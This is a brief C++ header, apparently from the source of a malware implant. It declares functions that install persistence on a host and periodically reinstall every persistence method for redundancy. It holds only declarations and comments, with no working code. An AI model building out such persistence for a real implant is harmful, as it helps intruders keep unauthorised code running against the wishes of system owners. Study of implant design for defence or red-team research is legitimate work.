#pragma once
#include <string>

namespace persistence {

// Establishes persistence.
// Returns true if this is the first run and persistence was just installed.
// Returns false if the implant is already running from its persistence location.
bool establishPersistence(const std::wstring& overrideSourcePath = L"");

// Periodically re-installs all persistence methods to ensure redundancy.
void ReinstallPersistence();

} // namespace persistence
